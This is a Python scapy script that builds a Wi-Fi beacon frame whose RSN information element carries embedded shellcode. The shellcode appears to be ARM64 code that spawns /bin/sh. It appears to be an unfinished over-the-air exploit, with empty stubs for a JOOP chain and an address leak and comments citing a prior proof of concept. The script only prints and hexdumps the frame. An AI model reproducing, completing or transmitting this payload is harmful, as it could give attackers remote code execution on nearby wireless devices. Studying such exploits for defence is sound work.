from struct import *
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump

def construct_joop():
    """
    Construct joop chain
    """
    pass

def leak():
    """
    This to receive leak :) let's just pray this works :)
    """
    pass


def main():
    shellcode = "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

    netSSID = 'testSSID' #Network name here
    iface = 'wlan0mon'   #Interface name here
    """
        this is from poc from parse_defense and we need to understand how the header looks
        uint8_t RADIOTAP[] ={0x00 ,0x00 ,0x34 ,0x00 ,0x6f ,0x08 
            ,0x10 ,0x40 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0c ,0xf7 ,0x17 ,0x40 ,0x01 \
            ,0x1e ,0xa0 ,0x00 ,0x00 ,0x00 ,0x00 ,0x48 ,0x00 ,0x13 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0b \
            ,0x86 ,0x00 ,0x0a ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x8b ,0x00 ,0x00 ,0x00 ,0x55 ,0x01};
    """
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
    addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x02\x00'
    '\x00\x0f\xac\x04'
    '\x00\x0f\xac\x02'
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x00\x00'
    #here be shellcode
    "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"))

    frame = RadioTap()/dot11/beacon/essid/rsn

    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)
    print("\n")
    hexdump(shellcode)

if __name__ == "__main__":
    main()